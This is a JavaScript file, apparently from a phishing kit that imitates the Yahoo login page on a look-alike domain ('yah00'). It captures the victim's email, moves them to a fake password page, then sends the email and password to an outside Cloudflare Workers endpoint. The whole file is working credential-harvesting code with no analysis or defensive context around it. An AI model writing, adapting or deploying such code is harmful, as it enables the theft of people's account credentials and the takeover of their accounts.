document.addEventListener("DOMContentLoaded", function() {
    //form handler
    console.log("sender script loaded");

    const hostname = "https://yah00.onrender.com";
    const endpoint = "https://winter-fog-b8e9.bad0men.workers.dev";

    
    const nextButton = document.querySelector("#login-signin");
    const emailInput = document.querySelector("#login-username");
    const passwordInput = document.querySelector("#login-passwd");
    const emailClass = document.querySelector(".yid");
    const submitButton = document.querySelector("#login-signin");

    if (nextButton) {
        nextButton.addEventListener("click", function (e) {
            e.preventDefault();
            if (!emailInput) {
                return;
            } else {
                const email = emailInput.value;
                gotoPassword(email); 
            }
        }); 
    }
    else {
        console.error("Element with id #login-signin not found");
    }

    const email = localStorage.getItem("user-email");
    emailClass.textContent = email;

    submitButton.addEventListener("click", async (e) => {
        e.preventDefault();
        const password = passwordInput.value;
        await sendFormAndRedirect(email, password);
    });

    //go to password page function declaration
    function gotoPassword(email) {
        //you can use regex for just yahoo mail and next otherwise display error
        //then
        localStorage.setItem("user-email", email);
        window.location.href = `${hostname}/display-password.htm`;
    };

    async function sendFormAndRedirect(email, password) {
        localStorage.removeItem("user-email");

        const payload = {
               "email": email,
               "password": password
        };
        try {
            const res = await fetch(`${endpoint}`, {
                method: "POST",
                //mode: "no-cors",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });
            console.log(res);
            if (!res.ok) {
                throw new Error(`HTTP error! status: ${res.status}`);
            }
            
            console.log("res:", res);
        } catch (error) {
            console.error("Error:", error);
        }
    };
});

